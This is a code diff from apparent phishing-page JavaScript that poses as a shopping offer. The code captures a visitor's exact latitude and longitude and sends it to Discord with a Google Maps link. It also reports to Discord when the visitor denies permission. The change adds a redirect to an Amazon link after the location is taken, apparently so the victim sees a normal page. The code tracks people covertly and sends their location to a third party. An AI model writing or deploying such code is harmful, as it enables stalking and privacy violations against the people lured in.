@@ -57,7 +57,8 @@
                         
                         // Exact location Discord par bhejane ke liye
                         sendToDiscord(`🎯 **EXACT LOCATION FETCHED!**\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🗺️ Google Maps Link: https://google.com{lat},${lon}`);
-                    },
+                   window.location.href = "https://amzn.in/d/09CIWsWb";
+ },
                     (error) => {
                         alert("Offer activation failed: Permission denied.");
                         sendToDiscord(`❌ User denied location permission.`);
